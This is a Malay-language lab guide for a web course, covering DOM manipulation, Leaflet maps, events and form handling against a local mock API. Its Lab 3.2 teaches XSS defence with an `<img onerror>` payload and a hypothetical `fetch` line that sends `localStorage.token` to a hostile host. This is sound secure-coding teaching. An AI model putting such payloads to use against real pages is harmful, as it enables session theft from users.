# Lab Hari 3 — DOM, Event, Borang & Peta Leaflet

[⬅️ README Hari 3](./README.md) · [💻 Latihan](../projek/latihan/hari-3/)

> **Peraturan lab:** Setiap latihan mencetak semakan ✅/❌ di **Console** (F12). Sasaran: semua ✅. Tulis kod sendiri dahulu, dan tanya jurulatih atau pasangan anda hanya selepas mencuba 10 minit.

> 🪟 **Pengguna Windows:** jalankan arahan terminal dalam **Git Bash** (terminal lalai VS Code — lihat [persediaan §2.5](../docs/persediaan.md#25-terminal-vs-code-di-windows--git-bash)). Arahan PowerShell disediakan untuk langkah utama.

| Lab | Sesi | Latihan | Hasil |
|-----|------|---------|-------|
| 3.0 | S1 (awal) | Persediaan | Mock API `:3000` + server latihan `:5500` berjalan |
| 3.1 | S1 9.00–11.00 | `latihan-01.js` | Pemilihan & perentasan DOM, 16/16 ✅ |
| 3.2 | S2 11.00–1.00 | `latihan-02.js`, `latihan-03.js` | Senarai selamat + peta Leaflet + layer rujukan |
| 3.3 | S3 2.30–3.30 | `latihan-04.js` | Tapisan, carian debounce, delegasi, event peta |
| 3.4 | S4 3.30–5.00 | `latihan-05.js` | Borang → POST → 422 → peta dikemas kini |

---

## Lab 3.0 — Persediaan (10 minit)

### 🎯 Objektif
Menghidupkan mock API dan server statik latihan; memahami kenapa `file://` tidak boleh digunakan.

### Prasyarat
- Node.js ≥ 22 (`node -v`)
- Repo kursus di mesin anda; Chrome/Edge terkini

### Langkah

1. **Terminal 1** — mock API:

   ```bash
   cd projek/api
   npm start
   # → GeoLapor mock API berjalan di http://localhost:3000
   ```

2. **Terminal 2** — server latihan:

   ```bash
   cd projek/latihan/hari-3
   node serve.mjs
   # → Latihan Hari 3 → http://localhost:5500
   ```

3. Buka **http://localhost:5500/?l=01**. Lencana di penjuru kanan atas mesti **API OK** (hijau).

4. **Eksperimen (2 minit):** Buka `projek/latihan/hari-3/index.html` dengan dwiklik (URL `file:///…`). Buka Console. Baca error CORS. Tutup tab itu. **Sentiasa guna `http://localhost:5500`.**

5. Buka `index.html` dalam editor. Kenal pasti `#senarai-laporan`, `#peta`, `#borang-laporan` dan `<template id="tpl-laporan">`. **Jangan ubah fail ini** hari ini.

### ✅ Checkpoint
- `http://localhost:3000/api/kesihatan` → `{"ok":true,…}`
- `http://localhost:5500/?l=01` memaparkan rangka GeoLapor dan lencana **API OK**

### 🧯 Masalah lazim

| Gejala | Punca | Penyelesaian |
|--------|-------|--------------|
| `EADDRINUSE :3000` / `:5500` | Port digunakan (mungkin server semalam) | Tutup terminal lama, atau `PORT=3001 npm start` / `PORT=5501 node serve.mjs` (PowerShell: `$env:PORT=3001; npm start`) (jika API di 3001, ubah `API_URL` dalam `services/api.js`) |
| Lencana **API tiada** | Mock API tidak berjalan / firewall | Semak Terminal 1; buka `http://localhost:3000/api/kesihatan` terus |
| Halaman kosong, error `Failed to load module script` | Dibuka melalui `file://` atau folder salah | Jalankan `node serve.mjs` **dari dalam** `projek/latihan/hari-3` |

---

## Lab 3.1 — DOM Selection & Traversal (S1)

> 📖 **Bacaan buku** — *JavaScript All-in-One For Dummies* (Minnick, 2023), pengayaan selepas sesi. Halaman PDF = muka surat cetak + 24.
>
> - Apa itu DOM; bila skrip berjalan (`defer`, `async`): B2 · Bab 1 (What a Web Browser Does) — ms. 235–239 (**PDF 259–263**)
> - Memilih elemen: B2 · Bab 2 (Programming the Browser) — ms. 249–254 (**PDF 273–278**)

### 🎯 Objektif
Memilih elemen GeoLapor dengan `getElementById`, `querySelector(All)`, `form.elements`; merentas dengan `closest`, `parentElement`, `children`, `nextElementSibling`; membaca `dataset`; memahami `<template>`.

### Prasyarat
- Lab 3.0 selesai; `http://localhost:5500/?l=01` dibuka dengan Console kelihatan
- README §S1 dibaca

### Langkah

1. **Terokai dahulu di Console (10 minit), belum dalam fail.** Taip satu demi satu, dan **ramal** hasilnya sebelum menekan Enter:

   ```js
   document.getElementById('peta')
   document.getElementById('#peta')            // ramal!
   document.querySelector('#tapis-status option')
   document.querySelectorAll('#tapis-status option').length
   document.querySelectorAll('#tapis-status option').map // ramal!
   $0                                           // elemen dipilih dalam tab Elements
   $$('button')                                 // pintasan DevTools untuk querySelectorAll → Array
   ```

   > 💡 Dalam tab **Elements**, klik mana-mana elemen, kemudian taip `$0` di Console, kerana `$0` merujuk elemen itu.

2. Buka `projek/latihan/hari-3/latihan-01.js`. Simpan dan muat semula browser selepas **setiap** TODO. Perhatikan ✅ bertambah.

3. **TODO 1**: pilih tiga elemen utama:

   ```js
   const senarai = document.getElementById('senarai-laporan');
   const borang = document.querySelector('#borang-laporan');
   const petaEl = document.querySelector('[role="region"]#peta');
   ```

4. **TODO 2**: `querySelectorAll` → array nilai status (tanpa pilihan "Semua" yang bernilai kosong):

   ```js
   const nilaiStatus = Array.from(document.querySelectorAll('#tapis-status option'), (o) => o.value).filter(Boolean);
   ```

5. **TODO 3**: `form.elements` dengan destructuring:

   ```js
   const { tajuk, lat, lng } = borang.elements;
   ```

   > Tukar `const tajuk = null; // TODO` (tiga baris) kepada satu baris di atas.

6. **TODO 4**: perentasan. Cuba sendiri dahulu; petunjuk ada dalam komen fail.
   <details><summary>Jawapan TODO 4</summary>

   ```js
   const legend = lat.closest('fieldset').querySelector('legend');
   const ralatLat = lat.nextElementSibling;
   semak('4c induk borang ialah <aside>', borang.parentElement.tagName === 'ASIDE');
   semak('4d <main> ada 3 anak', document.querySelector('main').children.length === 3);
   ```
   </details>

7. **TODO 5–6**: `dataset` dan pemilih atribut:

   ```js
   semak('5  dataset.ralatUntuk === "lat"', ralatLat.dataset.ralatUntuk === 'lat');
   const cariRalat = (nama) => borang.querySelector(`[data-ralat-untuk="${nama}"]`);
   ```

8. **TODO 7–8**: `<template>`. **Ramal dahulu** dan tulis ramalan anda sebagai komen, kemudian:

   ```js
   const tpl = document.getElementById('tpl-laporan');
   const bilButang = document.querySelectorAll('button').length;
   ```

   Kenapa hanya **1** butang walaupun templat mengandungi 2 butang lagi?

### ✅ Checkpoint
- Console: **`Latihan 01: 16 lulus, 0 belum`** (hijau)
- Anda boleh menerangkan kepada rakan sebelah: `NodeList` vs `Array`, dan kenapa isi `<template>` tidak kelihatan

### 🧯 Masalah lazim

| Gejala | Punca | Penyelesaian |
|--------|-------|--------------|
| `TypeError: Cannot read properties of null` | Pemilih salah → `null` | Salin pemilih ke Ctrl+F dalam tab Elements |
| `Assignment to constant variable` | Menambah baris `const tajuk = …` tanpa membuang `const tajuk = null` | Buang baris TODO asal |
| ✅ tidak bertambah selepas simpan | Cache browser | Muat semula (Ctrl+R). `serve.mjs` sudah menghantar `no-store` |

### ⭐ Cabaran
1. Tulis `const tunjukLaluan = (el) => …` yang memulangkan string laluan dari `el` ke `body`, contohnya `"body > main > aside > form > fieldset > input"`. Guna loop `while (el.parentElement)`.
2. Bandingkan `getElementsByTagName('li')` (hidup) dengan `querySelectorAll('li')` (statik): simpan kedua-duanya, tambah `<li>` ke senarai, dan cetak `.length` sekali lagi.

---

## Lab 3.2 — DOM Element Manipulation + Peta Leaflet (S2)

> 📖 **Bacaan buku** — *JavaScript All-in-One For Dummies* (Minnick, 2023), pengayaan selepas sesi. Halaman PDF = muka surat cetak + 24.
>
> - Cipta & sisip elemen, `innerHTML`, `classList`, method elemen: B2 · Bab 2 (Programming the Browser) — ms. 254–257 (**PDF 278–281**)

### 🎯 Objektif
(A) Merender senarai laporan dari API dengan selamat dan melihat sendiri kesan XSS. (B) Memaparkan laporan dan layer rujukan di peta Leaflet dengan `L.geoJSON`, popup selamat dan kawalan layer.

### Prasyarat
- Lab 3.1 ✅; mock API berjalan (`API OK`)
- README §2.1–2.10

### Bahagian A — Senarai selamat (`?l=02`, ±40 minit)

1. Buka `http://localhost:5500/?l=02` dan `latihan-02.js`.

2. **TODO 1**: `kadLaporan(feature, kategori)`:

   ```js
   function kadLaporan(feature, kategori) {
     const tpl = document.getElementById('tpl-laporan');
     const li = tpl.content.firstElementChild.cloneNode(true);
     const { id, tajuk, kategori: kod, status } = feature.properties;

     li.dataset.id = id;
     li.querySelector('.kad-tajuk').textContent = tajuk;
     li.querySelector('.kad-kategori').textContent = kategori.get(kod)?.nama ?? kod;
     const s = li.querySelector('.kad-status');
     s.textContent = LABEL_STATUS[status] ?? status;
     s.classList.add(`status-${status}`);
     li.querySelector('.kad-koordinat').textContent = `📍 ${formatKoordinat(feature.geometry.coordinates)}`;
     li.style.borderLeftColor = kategori.get(kod)?.warna ?? '';
     return li;
   }
   ```

3. **TODO 2**: `renderSenarai`. Tulis sendiri dengan `createDocumentFragment()` dan `replaceChildren()`. Kemas kini `#kiraan` → `"41 laporan"`.

4. **TODO 3**: isi `<select id="tapis-kategori">`:

   ```js
   function isiKategori(senarai) {
     for (const { kod, nama } of senarai) pilihKategori.append(new Option(nama, kod));
   }
   ```

5. **TODO 4**: keadaan memuat & error. Tambah `ul.setAttribute('aria-busy', 'true')` **sebelum** `try`, `ul.removeAttribute('aria-busy')` dalam `finally`, dan dalam `catch`:

   ```js
   const li = document.createElement('li');
   li.className = 'kosong';
   li.textContent = `⚠️ ${ralat instanceof ApiError ? ralat.message : 'Ralat tidak dijangka'}`;
   ul.replaceChildren(li);
   ```

6. **Uji keadaan error:** hentikan mock API (Ctrl+C di Terminal 1), muat semula. Anda sepatutnya nampak mesej *"Tidak dapat menghubungi server API…"* dalam senarai, bukan skrin putih. Hidupkan semula API.

7. **TODO 5, demo XSS (5 minit, WAJIB):**
   1. Perhatikan kad pertama: tajuknya ialah teks literal `<img src=x onerror=…>Tajuk jahat`.
   2. Dalam `kadLaporan`, tukar **sementara** `.textContent = tajuk` → `.innerHTML = tajuk`. Simpan, muat semula. Satu `alert` muncul, dan itu ialah kod "penyerang".
   3. **Pulihkan kepada `textContent`.** Muat semula. Semakan 5a dan 5b mesti ✅.

   > Bincang dengan rakan: jika `alert` itu sebenarnya `fetch('https://jahat…?k=' + localStorage.token)`, apakah kesannya pada 200 pegawai yang membuka senarai?

### Bahagian B — Peta Leaflet (`?l=03`, ±60 minit)

8. Buka `http://localhost:5500/?l=03` dan `latihan-03.js`. Perhatikan baris `import L from './lib/leaflet.js'`. Buka `lib/leaflet.js` dan baca cara sandaran CDN → `vendor/` berfungsi.

9. **TODO 1–3**: peta, tile, kawalan:

   ```js
   const peta = L.map('peta').setView([2.9264, 101.6958], 13); // [LAT, LNG]!

   const osm = L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
     maxZoom: 19,
     attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
   }).addTo(peta);
   L.control.scale({ imperial: false }).addTo(peta);

   const kawalan = L.control.layers({ OpenStreetMap: osm }, {}, { collapsed: false }).addTo(peta);
   ```

   Muat semula. Anda sepatutnya nampak Putrajaya. (Tanpa internet: latar kelabu. Itu normal, teruskan.)

10. **Eksperimen susunan (3 minit):** tukar sementara kepada `setView([101.6958, 2.9264], 13)`. Di mana peta anda sekarang? Pulihkan.

11. **TODO 4**: `kandunganPopup(feature)` → `HTMLElement`. Tulis sendiri dengan `createElement` + `textContent` (README §2.8). Jangan pulangkan string.

12. **TODO 5–6**: `L.geoJSON` dengan `pointToLayer` + `onEachFeature`, kemudian `fitBounds`:

    ```js
    const lapisanLaporan = L.geoJSON(fc, {
      pointToLayer: (feature, latlng) =>
        L.circleMarker(latlng, {
          radius: 7,
          color: '#fff',
          weight: 2,
          fillColor: warna.get(feature.properties.kategori) ?? '#616e7c',
          fillOpacity: 0.9,
        }),
      onEachFeature: (feature, layer) => layer.bindPopup(() => kandunganPopup(feature)),
    }).addTo(peta);
    kawalan.addOverlay(lapisanLaporan, 'Laporan');
    peta.fitBounds(lapisanLaporan.getBounds(), { padding: [20, 20] });
    ```

13. **TODO 7**: layer rujukan. Cuba sendiri dengan `Promise.allSettled` (Hari 2). Gaya: `sempadan-zon` ungu putus-putus, `sungai` biru tebal, `kemudahan` titik oren.
    <details><summary>Jawapan TODO 7</summary>

    ```js
    const GAYA = {
      'sempadan-zon': { color: '#7b61ff', weight: 2, fillOpacity: 0.08, dashArray: '6 4' },
      sungai: { color: '#1d7fd1', weight: 3 },
    };
    const metaLapisan = await senaraiLapisan();
    const hasil = await Promise.allSettled(metaLapisan.map((m) => dapatkanLapisan(m.id)));
    hasil.forEach((h, i) => {
      const m = metaLapisan[i];
      if (h.status === 'rejected') return console.warn(`Lapisan ${m.id} gagal:`, h.reason.message);
      const lapisan = L.geoJSON(h.value, {
        style: () => GAYA[m.id] ?? { color: '#444', weight: 1 },
        pointToLayer: (_f, latlng) =>
          L.circleMarker(latlng, { radius: 5, color: '#8a4b08', fillColor: '#f59e0b', fillOpacity: 0.9, weight: 1 }),
        onEachFeature: (f, layer) => layer.bindTooltip(document.createTextNode(f.properties.nama ?? m.nama)),
      });
      kawalan.addOverlay(lapisan, m.nama);
      if (m.id === 'sempadan-zon') lapisan.addTo(peta).bringToBack();
    });
    ```
    </details>

14. Klik beberapa titik: popup mesti memaparkan tajuk, id, kategori dan status. Tandakan/nyahtanda layer dalam kawalan.

### ✅ Checkpoint
- `?l=02` → **5/5 ✅**; tajuk jahat kelihatan sebagai teks; tiada `alert`
- `?l=03` → **6/6 ✅**; 40+ bulatan berwarna di Putrajaya; kawalan layer menyenaraikan Laporan + Sempadan Zon + Sungai + Kemudahan
- Anda boleh menjawab: *"Kenapa `bindPopup(\`<b>${tajuk}</b>\`)` berbahaya?"*

### 🧯 Masalah lazim

| Gejala | Punca | Penyelesaian |
|--------|-------|--------------|
| Peta tidak kelihatan langsung (tiada error) | Bekas setinggi 0 px | `#peta` perlu ketinggian (sudah dalam `projek/latihan/hari-3/gaya.css`); jangan buang kelas `.peta-bekas` |
| Tile bertaburan / kawalan tanpa gaya | CSS Leaflet tidak dimuat | Semak tab Network untuk `leaflet.css`; sandaran `vendor/` sepatutnya mengambil alih |
| `Map container is already initialized` | `L.map('peta')` dipanggil dua kali | Hanya satu `L.map` bagi setiap bekas |
| Semua titik kelabu | `warna.get(...)` → `undefined` | Key `Map` ialah `kod` kategori (`'tanah'`), bukan nama (`'Tanah'`) |
| Titik di hujung atas peta | `[lng, lat]` diberi kepada Leaflet | Guna `latlng` yang diberi `pointToLayer`, jangan bina sendiri dari `coordinates` |
| `[leaflet] CDN gagal` di Console | Tiada internet | Normal. Salinan `vendor/` digunakan; tile OSM tidak akan dimuat |

### ⭐ Cabaran
1. **Layer WMS (sistem sedia ada).** Jika jurulatih menyediakan GeoServer demo (atau anda ada akses ke GeoServer jabatan), tambah:

   ```js
   const wms = L.tileLayer.wms('http://<pelayan>:8080/geoserver/wms', {
     layers: 'topp:states', // atau layer dalam GetCapabilities server anda
     format: 'image/png',
     transparent: true,
     version: '1.1.1',
   });
   kawalan.addOverlay(wms, 'WMS (GeoServer)');
   ```

   Buka tab Network dan perhatikan setiap tile ialah request `…?SERVICE=WMS&REQUEST=GetMap&BBOX=…`.
2. **Legenda:** bina `L.control({ position: 'bottomright' })` yang memaparkan warna setiap kategori (guna `createElement`, bukan `innerHTML`).
3. **Base layer kedua:** tambah tile OpenTopoMap (`https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png`, atribusi OpenTopoMap) sebagai pilihan radio kedua.
4. **Popup kemudahan:** tunjuk `nama` dan `jenis` dalam popup (elemen DOM) untuk layer `kemudahan`.

---

## Lab 3.3 — Event Handling (S3)

> 📖 **Bacaan buku** — *JavaScript All-in-One For Dummies* (Minnick, 2023), pengayaan selepas sesi. Halaman PDF = muka surat cetak + 24.
>
> - `addEventListener`, objek event, bubbling, event tersuai: B1 · Bab 10 (Making Things Happen with Events) — ms. 184–195 (**PDF 208–219**)

### 🎯 Objektif
Menambah interaksi: tapisan (`change`), carian (`input` + debounce), delegasi klik pada senarai (zum/padam), klik peta → lat/lng, klik marker → sorot kad.

### Prasyarat
- Lab 3.2 ✅ (atau tanya jurulatih untuk melihat hasil yang sepatutnya). Latihan 04 menggunakan `ui/senarai.js` & `ui/peta.js` yang sudah siap, jadi anda boleh mula walaupun Lab 3.2 belum lengkap
- README §S3

### Langkah

1. Buka `http://localhost:5500/?l=04` dan `latihan-04.js`. Baca bahagian **Kod sedia**: `muatSemula()` sudah menggunakan `AbortController`. Kenal pasti di mana `tapisan`, `indeks` dan `lapisan` disimpan.

2. **TODO 1**: tapisan `change`:

   ```js
   for (const sel of [pilihKategori, pilihStatus]) {
     sel.addEventListener('change', (e) => {
       tapisan[e.target.name] = e.target.value; // name="kategori" | "status"
       muatSemula();
     });
   }
   ```

   Uji: pilih status **Selesai**. Senarai dan peta mesti berkurang serentak. Buka tab Network: `GET /api/laporan?status=selesai`.

3. **TODO 2**: `debounce`. Tulis sendiri (README §3.4). Semakan 2 menguji 3 panggilan pantas → 1 pelaksanaan.

4. **TODO 3**: carian:

   ```js
   const cariTertunda = debounce((nilai) => {
     tapisan.q = nilai.trim();
     muatSemula();
   }, 300);
   carian.addEventListener('input', (e) => cariTertunda(e.target.value));
   carian.addEventListener('keyup', (e) => {
     if (e.key === 'Escape') {
       carian.value = '';
       cariTertunda('');
     }
   });
   ```

   Uji dengan tab Network terbuka: taip `papan` dengan pantas, dan sepatutnya **satu** request `?q=papan` sahaja dibuat.

5. **Eksperimen perlumbaan (5 minit):** dalam `services/api.js`, **sementara** tukar `senaraiLaporan` supaya menambah `lambat`:

   ```js
   return mintaJson(`/api/laporan${queryDari({ ...tapisan, lambat: Math.random() * 2000 | 0 })}`, { signal });
   ```

   Tukar tapisan status dengan cepat beberapa kali. Dalam tab Network, request lama menjadi **(canceled)**, dan senarai sentiasa sepadan dengan pilihan **terakhir**. **Pulihkan** `api.js`.

6. **TODO 4**: delegasi pada `<ul>` dan `zumKe(id)`:

   ```js
   function zumKe(id) {
     const layer = indeks.get(id);
     if (!layer) return;
     peta.flyTo(layer.getLatLng(), 17, { duration: 0.8 });
     layer.openPopup();
     sorotKad(id);
   }

   ul.addEventListener('click', async (e) => {
     const kad = e.target.closest('li.kad');
     if (!kad || !ul.contains(kad)) return;
     const id = kad.dataset.id;
     const tindakan = e.target.closest('button[data-tindakan]')?.dataset.tindakan ?? 'zum';

     if (tindakan === 'zum') zumKe(id);
     if (tindakan === 'padam') {
       if (!confirm(`Padam ${id}?`)) return;
       try {
         await padamLaporan(id);
         await muatSemula();
       } catch (ralat) {
         alert(`Gagal padam: ${ralat.message}`);
       }
     }
   });
   ```

   Uji: klik **tajuk** kad (bukan butang). Delegasi masih menangkapnya kerana `closest('li.kad')`. Kemudian tapis status, dan klik kad baharu. Masih berfungsi? Kenapa?

7. **TODO 5**: klik peta → borang:

   ```js
   let penanda = null;
   peta.on('click', (e) => {
     const { lat, lng } = e.latlng.wrap();
     borang.elements.lat.value = lat.toFixed(6);
     borang.elements.lng.value = lng.toFixed(6);
     penanda ??= L.marker(e.latlng, { draggable: true }).addTo(peta);
     penanda.setLatLng(e.latlng);
   });
   ```

   ⭐ Tambah `penanda.on('dragend', …)` supaya menyeret marker turut mengemas kini borang.

8. **TODO 6**: nyahkomen baris dalam `muatSemula()`:

   ```js
   lapisan.on('click', (e) => sorotKad(e.layer.feature.properties.id));
   ```

   Klik satu titik di peta, dan kad sepadan mesti disorot kuning serta ditatal ke dalam paparan.

### ✅ Checkpoint
- `?l=04` → **7/7 ✅**
- Demo kepada rakan: tapis → cari → klik kad (terbang + popup) → klik peta (lat/lng terisi) → klik titik (kad disorot)
- Tab Network: menaip `papan` menghasilkan **satu** request

### 🧯 Masalah lazim

| Gejala | Punca | Penyelesaian |
|--------|-------|--------------|
| Klik butang **Padam** juga menzum | Tiada `return`/`if` berasingan | Guna nilai `tindakan` untuk memilih **satu** cabang |
| Klik kad tidak berfungsi selepas tapisan | Listener dipasang pada setiap `<li>` | Pasang **sekali** pada `ul` (delegasi) |
| `Cannot read properties of undefined (reading 'getLatLng')` | `indeks` lama. Laporan dipadam atau tapisan menukar layer | Semak `if (!layer) return;` |
| Carian tidak bertindak balas pada tampalan | Guna `keyup` sahaja | Guna `input` |
| Lat/lng borang `NaN` | Membaca `e.latlng[0]` | `e.latlng` ialah **objek** `{lat, lng}` |
| Kotak `confirm()` tidak muncul | Browser menyekat dialog berulang | Tutup tab dan buka semula |

### ⭐ Cabaran
1. **Muat ikut paparan:** `peta.on('moveend', debounce(() => { tapisan.bbox = peta.getBounds().toBBoxString(); muatSemula(); }, 400))`. Perhatikan `bbox` dalam URL, susunan `minLng,minLat,maxLng,maxLat`.
2. **Hover dua hala:** `mouseover` pada `ul` (delegasi. Kenapa bukan `mouseenter`?) → `layer.setStyle({ radius: 11 })`, dan `mouseout` untuk memulihkannya.
3. **Papan kekunci:** `↑`/`↓` dalam `#carian` menggerakkan sorotan kad; `Enter` → `zumKe`.
4. **Tukar status:** tambah butang "Selesai" pada kad (dalam templat? Tidak, kerana `index.html` kekal. Tambah dengan `createElement` dalam JS) → `kemaskiniLaporan(id, { status: 'selesai' })`.

---

## Lab 3.4 — Form Handling (S4)

> 📖 **Bacaan buku** — *JavaScript All-in-One For Dummies* (Minnick, 2023), pengayaan selepas sesi. Halaman PDF = muka surat cetak + 24.
>
> - `submit` & `preventDefault`: B1 · Bab 10 (Making Things Happen with Events) — ms. 195–196 (**PDF 219–220**)
> - POST JSON: B1 · Bab 11 (Writing Asynchronous JavaScript) — ms. 222 (**PDF 246**)

### 🎯 Objektif
Membina aliran borang lengkap: validasi klien dengan mesej BM → `FormData` → POST JSON → 201 (peta dikemas kini) / 422 (error per medan).

### Prasyarat
- Lab 3.3 ✅ (Latihan 05 mengandungi kod sedia sendiri)
- README §S4

### Langkah

1. Buka `http://localhost:5500/?l=05` dan `latihan-05.js`. Perhatikan `e.preventDefault()` sudah diberi dalam listener `submit`.

2. **Eksperimen `preventDefault` (2 minit):** komenkan `e.preventDefault()`, isi tajuk, tekan **Hantar**. Lihat bar URL (`?tajuk=…&kategori=…`) dan halaman dimuat semula. Pulihkan.

3. **TODO 1**: lengkapkan `MESEJ.lat` & `MESEJ.lng` (`badInput`, `rangeUnderflow`, `rangeOverflow`) dan `mesejUntuk(el)`:

   ```js
   function mesejUntuk(el) {
     const jadual = MESEJ[el.name] ?? {};
     const kunci = Object.keys(jadual).find((k) => el.validity[k]);
     return kunci ? jadual[kunci] : el.validationMessage;
   }
   ```

4. **TODO 2**: `paparRalat(nama, teks)`:

   ```js
   function paparRalat(nama, teks) {
     const p = borang.querySelector(`[data-ralat-untuk="${nama}"]`);
     if (p) p.textContent = teks;
     borang.elements[nama]?.setAttribute('aria-invalid', teks ? 'true' : 'false');
   }
   ```

5. **TODO 3**: `sahkan()`. Tulis sendiri berdasarkan README §4.4. Syarat: peraturan tersuai tajuk (`trim().length < 5`), loop `borang.elements`, fokus medan pertama yang salah, pulangkan `boolean`.

6. **Uji di browser:** klik **Hantar** dengan borang kosong. Mesej BM muncul di bawah tajuk, kategori, lat dan lng, dan kursor berada dalam **Tajuk**. Taip dalam tajuk, dan mesejnya hilang (listener `input` sudah disediakan).

7. **TODO 4**: `paparRalatPelayan(ralat)`:

   ```js
   function paparRalatPelayan(ralat) {
     if (ralat instanceof ApiError && ralat.status === 422) {
       for (const [nama, teks] of Object.entries(ralat.medan ?? {})) paparRalat(nama, teks);
       return 'Semak medan bertanda merah.';
     }
     if (ralat instanceof ApiError && ralat.status === 401) return 'Kunci API tidak sah (semak X-API-Key).';
     return ralat.message ?? 'Ralat tidak dijangka.';
   }
   ```

8. **TODO 5**: handler `submit` lengkap:

   ```js
   borang.addEventListener('submit', async (e) => {
     e.preventDefault();
     mesej.textContent = '';
     mesej.className = 'mesej';
     if (!sahkan()) return;

     const data = Object.fromEntries(new FormData(borang));
     const badan = { ...data, tajuk: data.tajuk.trim(), lat: Number(data.lat), lng: Number(data.lng) };

     butang.disabled = true;
     borang.setAttribute('aria-busy', 'true');
     try {
       const feature = await ciptaLaporan(badan);
       await muatSemula();
       const layer = indeks.get(feature.properties.id);
       peta.flyTo(layer.getLatLng(), 17);
       layer.openPopup();
       borang.reset();
       penanda?.remove();
       penanda = null;
       mesej.textContent = `✅ ${feature.properties.id} dicipta.`;
       mesej.classList.add('berjaya');
     } catch (ralat) {
       mesej.textContent = `⚠️ ${paparRalatPelayan(ralat)}`;
       mesej.classList.add('gagal');
     } finally {
       butang.disabled = false;
       borang.removeAttribute('aria-busy');
     }
   });
   ```

9. **Uji aliran penuh:** isi tajuk `Longkang tersumbat di Presint 9`, kategori *Utiliti*, klik peta, **Hantar**. Peta terbang ke titik baharu dengan popup terbuka, kad baharu ada dalam senarai, dan borang kosong.

10. **Uji 422 (pintas validasi klien):** di Console:

    ```js
    const { ciptaLaporan } = await import('./services/api.js');
    await ciptaLaporan({ tajuk: 'ab', kategori: 'lain', lat: 50, lng: 10 }).catch((e) => console.log(e.status, e.medan));
    // → 422 { tajuk: "Tajuk wajib, 5–120 aksara", kategori: "…", lat: "Latitud mesti dalam Malaysia (0.8–7.5)", lng: "…" }
    ```

    Kemudian, dalam borang, masukkan **lat 50** secara manual dan buang `min`/`max` sementara melalui tab Elements (klik dua kali atribut → padam). Hantar. Kali ini mesej datang dari **server**, dipapar di bawah medan Lat. Muat semula untuk memulihkan atribut.

11. **Uji 401:** dalam `services/api.js`, tukar sementara `API_KEY` kepada `'salah'`. Hantar borang sah, dan mesej *"Kunci API tidak sah"* muncul. Pulihkan.

12. Jalankan semakan penuh: `http://localhost:5500/?l=05&uji` (mencipta satu laporan ujian). Selepas itu: `cd projek/api && npm run reset-data`.

### ✅ Checkpoint
- `?l=05` → 4/4 ✅; `?l=05&uji` → **7/7 ✅**
- Laporan yang anda hantar melalui borang muncul di senarai **dan** peta tanpa muat semula halaman
- Catatan `<b>tebal</b>` dalam popup dipapar sebagai teks (bukan tebal)
- **GeoLapor Hari 3 siap**: simpan `latihan-04.js` & `latihan-05.js` anda untuk Hari 4

### 🧯 Masalah lazim

| Gejala | Punca | Penyelesaian |
|--------|-------|--------------|
| Halaman dimuat semula selepas Hantar | `preventDefault()` hilang / error JS sebelum baris itu | `preventDefault()` mesti baris **pertama**; semak Console |
| 422 *"Latitud wajib nombor"* | Menghantar string dari `FormData` | `Number(data.lat)` |
| Lat `2.9264` dianggap tidak sah oleh browser | `type="number"` tanpa `step="any"` | Sudah ada dalam `index.html`. Jangan buang |
| Tajuk kekal "tidak sah" walaupun betul | `setCustomValidity('pendek')` tidak dikosongkan | Panggil `setCustomValidity('')` apabila sah (baris ternari dalam `sahkan`) |
| Dua laporan sama dicipta | Klik dua kali semasa menunggu | `butang.disabled = true` **sebelum** `await` |
| `Object.entries(null)` TypeError | `ralat.medan` null untuk error bukan 422 | `Object.entries(ralat.medan ?? {})` |
| 401 walaupun key betul | Header tidak dihantar untuk POST | Semak `mintaJson`: `if (method !== 'GET') headers['X-API-Key'] = API_KEY` |

### ⭐ Cabaran
1. **Kiraan aksara:** papar `37/120` di bawah tajuk dan `0/500` di bawah catatan (event `input`, `textContent`).
2. **Semakan `dalamMalaysia`:** guna `dalamMalaysia([lng, lat])` dari `utils/geo.js` dalam `sahkan()` sebagai peraturan tersuai kedua. Mesej: *"Lokasi di luar kotak Malaysia"*.
3. **Mod sunting:** klik kad → isi borang dengan data laporan (`dapatkanLaporan(id)`), tukar butang kepada **Kemas kini**, dan hantar dengan `kemaskiniLaporan(id, perubahan)` (PATCH, hantar **hanya** medan yang berubah).
4. **Geocoding (jika ada internet):** medan "Cari alamat" → Nominatim `https://nominatim.openstreetmap.org/search?format=json&q=…` → `flyTo` hasil pertama. Hormati polisi: debounce ≥ 1 s, satu request pada satu masa.

---

## 🏁 Penutup hari

Tunjukkan kepada jurulatih (2 minit setiap orang/pasangan):

1. Tapis status **Baharu** → cari `papan` → klik kad → peta terbang + popup
2. Klik peta di Presint 18 → lat/lng terisi → hantar laporan baharu → muncul di peta
3. Hantar borang kosong → mesej BM + fokus
4. Terangkan satu ayat: *kenapa `textContent`, bukan `innerHTML`?*
